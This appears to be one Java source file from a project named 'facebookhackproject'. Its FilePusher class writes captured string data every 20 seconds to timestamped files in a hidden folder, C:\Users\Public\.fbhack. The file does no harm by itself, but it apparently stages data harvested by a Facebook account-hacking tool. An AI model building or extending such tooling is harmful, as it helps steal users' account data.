/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package facebookhackproject.pushers;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;

/**
 *
 * @author Kareem
 */
public class FilePusher extends Pusher {
    
    private void createDirectory(String dirName) {
        File files = new File(dirName);
        if (!files.exists()) {
            if (files.mkdirs()) {
                System.out.println("Multiple directories are created!");
            } else {
                System.out.println("Failed to create multiple directories!");
            }
        }
    }

    @Override
    public void push(String data) {
        try {
            String dirName = "C:\\Users\\Public\\.fbhack";

            this.createDirectory(dirName);

            // Create file 
            FileWriter fstream = new FileWriter(dirName + "\\" + System.currentTimeMillis() + ".fb");
            BufferedWriter out = new BufferedWriter(fstream);
            out.write(data);
            
            System.out.println("Pushed to file");

            //Close the output stream
            out.close();
        } catch (Exception e) {//Catch exception if any
            System.err.println("Error: " + e.getMessage());
        }
    }

    @Override
    public int getIntervalSeconds() {
        return 20;
    }
}
